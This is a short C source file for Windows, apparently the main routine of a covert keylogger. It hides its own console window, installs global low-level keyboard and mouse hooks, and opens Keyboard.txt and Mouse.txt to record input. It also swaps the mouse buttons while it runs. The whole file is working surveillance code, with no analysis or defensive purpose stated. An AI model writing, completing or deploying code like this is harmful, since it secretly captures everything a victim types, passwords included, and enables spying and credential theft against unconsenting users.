#include "library.h"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	const char* name_file_for_keyboard = "Keyboard.txt";
	const char* name_file_for_mouse = "Mouse.txt";
	HHOOK hook_keyboard = 0;
	HHOOK hook_mouse;

	hook_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, hook_for_keyboard, 0, 0);
	if (!hook_keyboard)
	{
		return ERROR_HOOK_KEYBOARD;
	}
	hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, hook_for_mouse, 0, 0);
	if (!hook_mouse)
	{
		UnhookWindowsHookEx(hook_keyboard);
		return ERROR_HOOK_MOUSE;
	}


	if (!open_file_for_keyboard(name_file_for_keyboard))
	{
		UnhookWindowsHookEx(hook_keyboard);
		UnhookWindowsHookEx(hook_mouse);
		return ERROR_OPEN_FILE_KEYBOARD;
	}

	if (!open_file_for_mouse(name_file_for_mouse))
	{
		close_file();
		UnhookWindowsHookEx(hook_keyboard);
		UnhookWindowsHookEx(hook_mouse);
		return ERROR_OPEN_FILE_KEYBOARD;
	}

	SwapMouseButton(true);

	MSG message;
	GetMessage(&message, NULL, NULL, NULL);

	SwapMouseButton(false);

	close_file();
	UnhookWindowsHookEx(hook_keyboard);
	UnhookWindowsHookEx(hook_mouse);

	return 0;
}